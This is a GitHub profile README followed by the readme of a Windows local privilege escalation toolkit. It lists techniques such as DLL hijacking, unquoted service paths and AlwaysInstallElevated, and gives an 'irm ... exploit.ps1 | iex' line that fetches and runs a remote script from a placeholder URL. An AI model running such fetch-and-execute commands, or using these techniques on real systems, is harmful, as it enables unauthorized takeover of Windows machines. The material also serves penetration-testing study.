<h1 align="left">Hey 👋 What's up?</h1>

###

<p align="left">Hello my name is Abbas Aghayev but internet knows me as d3hack. Can be d3hvck or d3hxck. If you can help me on anything, please do it. Love to share and work together with any professional.</p>

###

<h2 align="left">About me</h2>

###

<p align="left">✨ Im hacking Windows since 2011<br>📚 I'm currently learning AD DC and Advanced Penetration Testing Methods<br>🎯 Goals: Being HEAD OF CYBERSECURITY DIVISION<br>🎲 Fun fact: Do not trust any code on internet</p>

###

<h2 align="left">I work with</h2>

###

<div align="left">
  <img src="https://skillicons.dev/icons?i=powershell" height="40" alt="powershell logo"  />
  <img width="12" />
  <img src="https://cdn.simpleicons.org/c++/00599C" height="40" alt="cplusplus logo"  />
  <img width="12" />
  <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/c/c-original.svg" height="40" alt="c logo"  />
  <img width="12" />
  <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/vscode/vscode-original.svg" height="40" alt="vscode logo"  />
  <img width="12" />
  <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/python/python-original.svg" height="40" alt="python logo"  />
  <img width="12" />
  <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/windows8/windows8-original.svg" height="40" alt="windows8 logo"  />
</div>

###

<img align="left" height="400" src="https://raw.githubusercontent.com/d3hvck/WinPrivEsc/refs/heads/main/WindowsExploited.webp"  />

###

<div align="center">
  <img src="https://profile-counter.glitch.me/d3hvck/count.svg?"  />
</div>

###

<div align="center">
  <img src="https://github-read-medium-git-main.pahlevikun.vercel.app/latest?limit=4&username=@aghayev2a" alt="Layout with last medium posts"  />
</div>

###


# Windows Local Privilege Escalation

This tools is developed, tested and refined by "d3hack"
Like Uncle Ben said, "With great power comes great responsibility." But in our case...
💀 With great shell access comes absolute domination. 💀

Tested on win11 pro


Primary focused to escalate privileges: 

    - DLL Hijacking [+]

    - Service binPath [+]
    
    - Service UnquotedPathSvc [+]
    
    - Service Registry [+]
    
    - Service ExecFile  [+]

    - Registry Autorun [+]
    
    - Registry AlwaysInstallelevated [+] 

    - TrustedInstaller
    
    - Password Mining (Memory/Registry/Config File)

    - Scheduled Task [+]
    
    - Startup Application [+]

## Authors

- [d3hack @ LinkedIn ](https://linkedin.com/in/aghayev2a)

- [d3hvck @ Github  ](https://github.com/d3hvck)

## Usage

For extremely accuracy please run every scripts one by one 

```bash
  irm https://githubrawfilelink.com/blablabla/exploit.ps1 | iex 
```

```bash
  <> operator
  - dash
  / shash
  \ revers-shlash
  = equal
  $ val / def
  ' quot
  " double quot
```

Absolute Path in quotes:

 "C:\Program Files\Vuln Service\DLL.exe"

Relative Path
Windows
cmd.exe

Vuln Service Looks Like:

 - C:\Program Files\Vuln Service x64\DLL.exe /sc /q /r 
 - C:\Program Files\Vuln.exe Service x64\DLL.exe /sc /q /r 
 - C:\Program Files\Vuln Service.exe x64\DLL.exe /sc /q /r 
 - C:\Program Files\Vuln Service x64\DLL.exe /sc /q /r 